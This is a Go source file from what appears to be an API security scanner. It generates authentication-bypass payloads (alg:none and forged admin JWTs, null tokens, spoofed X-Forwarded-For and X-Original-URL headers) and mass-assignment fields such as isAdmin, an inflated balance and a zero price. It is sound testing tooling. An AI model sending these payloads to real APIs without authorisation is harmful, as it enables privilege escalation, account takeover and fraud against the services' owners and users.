package payloads

import (
	"github.com/su1ph3r/indago/pkg/types"
)

// AuthBypassGenerator generates authentication bypass payloads
type AuthBypassGenerator struct{}

// NewAuthBypassGenerator creates a new auth bypass generator
func NewAuthBypassGenerator() *AuthBypassGenerator {
	return &AuthBypassGenerator{}
}

// Type returns the attack type
func (g *AuthBypassGenerator) Type() string {
	return types.AttackAuthBypass
}

// Generate generates auth bypass payloads
func (g *AuthBypassGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	var payloads []Payload

	// JWT manipulation payloads
	payloads = append(payloads, g.jwtPayloads()...)

	// Parameter manipulation
	payloads = append(payloads, g.parameterPayloads()...)

	// Header manipulation
	payloads = append(payloads, g.headerPayloads()...)

	return payloads
}

// jwtPayloads generates JWT manipulation payloads
func (g *AuthBypassGenerator) jwtPayloads() []Payload {
	return []Payload{
		{
			Value:       "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
			Type:        types.AttackAuthBypass,
			Category:    "authentication",
			Description: "JWT with alg:none",
		},
		{
			Value:       "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid",
			Type:        types.AttackAuthBypass,
			Category:    "authentication",
			Description: "JWT with admin role claim",
		},
		{
			Value:       "null",
			Type:        types.AttackAuthBypass,
			Category:    "authentication",
			Description: "Null token",
		},
		{
			Value:       "",
			Type:        types.AttackAuthBypass,
			Category:    "authentication",
			Description: "Empty token",
		},
		{
			Value:       "undefined",
			Type:        types.AttackAuthBypass,
			Category:    "authentication",
			Description: "Undefined token",
		},
	}
}

// parameterPayloads generates parameter-based bypass payloads
func (g *AuthBypassGenerator) parameterPayloads() []Payload {
	return []Payload{
		{
			Value:       "true",
			Type:        types.AttackAuthBypass,
			Category:    "authentication",
			Description: "Boolean true bypass",
			Metadata:    map[string]string{"param": "admin"},
		},
		{
			Value:       "1",
			Type:        types.AttackAuthBypass,
			Category:    "authentication",
			Description: "Numeric true bypass",
			Metadata:    map[string]string{"param": "is_admin"},
		},
		{
			Value:       "admin",
			Type:        types.AttackAuthBypass,
			Category:    "authentication",
			Description: "Admin role value",
			Metadata:    map[string]string{"param": "role"},
		},
		{
			Value:       "administrator",
			Type:        types.AttackAuthBypass,
			Category:    "authentication",
			Description: "Administrator role value",
			Metadata:    map[string]string{"param": "role"},
		},
		{
			Value:       "root",
			Type:        types.AttackAuthBypass,
			Category:    "authentication",
			Description: "Root user",
			Metadata:    map[string]string{"param": "user"},
		},
	}
}

// headerPayloads generates header-based bypass payloads
func (g *AuthBypassGenerator) headerPayloads() []Payload {
	return []Payload{
		{
			Value:       "127.0.0.1",
			Type:        types.AttackAuthBypass,
			Category:    "authentication",
			Description: "X-Forwarded-For localhost",
			Metadata:    map[string]string{"header": "X-Forwarded-For"},
		},
		{
			Value:       "localhost",
			Type:        types.AttackAuthBypass,
			Category:    "authentication",
			Description: "X-Forwarded-Host localhost",
			Metadata:    map[string]string{"header": "X-Forwarded-Host"},
		},
		{
			Value:       "true",
			Type:        types.AttackAuthBypass,
			Category:    "authentication",
			Description: "X-Debug header",
			Metadata:    map[string]string{"header": "X-Debug"},
		},
		{
			Value:       "internal",
			Type:        types.AttackAuthBypass,
			Category:    "authentication",
			Description: "X-Custom-IP-Authorization",
			Metadata:    map[string]string{"header": "X-Custom-IP-Authorization"},
		},
		{
			Value:       "admin",
			Type:        types.AttackAuthBypass,
			Category:    "authentication",
			Description: "X-Original-URL bypass",
			Metadata:    map[string]string{"header": "X-Original-URL"},
		},
	}
}

// MassAssignmentGenerator generates mass assignment payloads
type MassAssignmentGenerator struct{}

// NewMassAssignmentGenerator creates a new mass assignment generator
func NewMassAssignmentGenerator() *MassAssignmentGenerator {
	return &MassAssignmentGenerator{}
}

// Type returns the attack type
func (g *MassAssignmentGenerator) Type() string {
	return types.AttackMassAssignment
}

// Generate generates mass assignment payloads
func (g *MassAssignmentGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	// Mass assignment works by adding extra fields, not modifying existing ones
	// Return payloads that represent fields to add

	return []Payload{
		{
			Value:       "true",
			Type:        types.AttackMassAssignment,
			Category:    "authorization",
			Description: "Add admin field",
			Metadata:    map[string]string{"field": "admin", "type": "boolean"},
		},
		{
			Value:       "true",
			Type:        types.AttackMassAssignment,
			Category:    "authorization",
			Description: "Add isAdmin field",
			Metadata:    map[string]string{"field": "isAdmin", "type": "boolean"},
		},
		{
			Value:       "true",
			Type:        types.AttackMassAssignment,
			Category:    "authorization",
			Description: "Add is_admin field",
			Metadata:    map[string]string{"field": "is_admin", "type": "boolean"},
		},
		{
			Value:       "admin",
			Type:        types.AttackMassAssignment,
			Category:    "authorization",
			Description: "Add role field",
			Metadata:    map[string]string{"field": "role", "type": "string"},
		},
		{
			Value:       "1",
			Type:        types.AttackMassAssignment,
			Category:    "authorization",
			Description: "Add role_id field",
			Metadata:    map[string]string{"field": "role_id", "type": "integer"},
		},
		{
			Value:       "true",
			Type:        types.AttackMassAssignment,
			Category:    "authorization",
			Description: "Add verified field",
			Metadata:    map[string]string{"field": "verified", "type": "boolean"},
		},
		{
			Value:       "active",
			Type:        types.AttackMassAssignment,
			Category:    "authorization",
			Description: "Add status field",
			Metadata:    map[string]string{"field": "status", "type": "string"},
		},
		{
			Value:       "999999",
			Type:        types.AttackMassAssignment,
			Category:    "authorization",
			Description: "Add balance/credits field",
			Metadata:    map[string]string{"field": "balance", "type": "number"},
		},
		{
			Value:       "0",
			Type:        types.AttackMassAssignment,
			Category:    "authorization",
			Description: "Add price field (zero)",
			Metadata:    map[string]string{"field": "price", "type": "number"},
		},
		{
			Value:       "2099-12-31",
			Type:        types.AttackMassAssignment,
			Category:    "authorization",
			Description: "Add subscription expiry",
			Metadata:    map[string]string{"field": "subscription_expires", "type": "date"},
		},
		{
			Value:       "premium",
			Type:        types.AttackMassAssignment,
			Category:    "authorization",
			Description: "Add account_type field",
			Metadata:    map[string]string{"field": "account_type", "type": "string"},
		},
		{
			Value:       "1",
			Type:        types.AttackMassAssignment,
			Category:    "authorization",
			Description: "Add user_id (owner) field",
			Metadata:    map[string]string{"field": "user_id", "type": "integer"},
		},
		{
			Value:       "true",
			Type:        types.AttackMassAssignment,
			Category:    "authorization",
			Description: "Add email_verified field",
			Metadata:    map[string]string{"field": "email_verified", "type": "boolean"},
		},
	}
}
